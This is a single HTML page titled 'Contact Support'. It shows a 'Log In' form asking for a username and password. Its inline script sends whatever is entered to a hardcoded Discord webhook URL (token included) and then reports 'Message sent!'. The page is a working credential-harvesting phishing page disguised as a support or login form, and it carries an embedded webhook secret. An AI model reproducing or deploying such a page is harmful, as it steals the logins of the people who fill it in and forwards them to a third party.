<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact Support</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <h1>Log In</h1>

        <form onsubmit="sendSupportMessage(event)">
            <input type="text" id="name" class="input-field" placeholder="Username" required>
            <textarea id="message" class="input-field" placeholder="Password" required style="height:120px;"></textarea>
            <button type="submit" class="login-button">Log In</button>
        </form>

        <p id="status"></p>
    </div>

    <script>
        async function sendSupportMessage(event) {
            event.preventDefault();

            const name = document.getElementById("name").value;
            const msg = document.getElementById("message").value;
            const status = document.getElementById("status");

            const webhookURL = "https://discordapp.com/api/webhooks/1445674227133976588/ink8ID_PzKPvI6_2OaUgvo-HC7tLOtkK6khEzJUkAMEcxG69hlhzqL5f42_Bgj_0dEGi"; // <-- paste your webhook

            const payload = {
                content: `ðŸ“© **New Message**\n**From:** ${name}\n**Message:** ${msg}`
            };

            try {
                const res = await fetch(webhookURL, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(payload)
                });

                if (res.ok) {
                    status.innerText = "Message sent!";
                    document.getElementById("name").value = "";
                    document.getElementById("message").value = "";
                } else {
                    status.innerText = "Error sending message.";
                }
            } catch (error) {
                status.innerText = "Connection error.";
            }
        }
    </script>
</body>
</html>
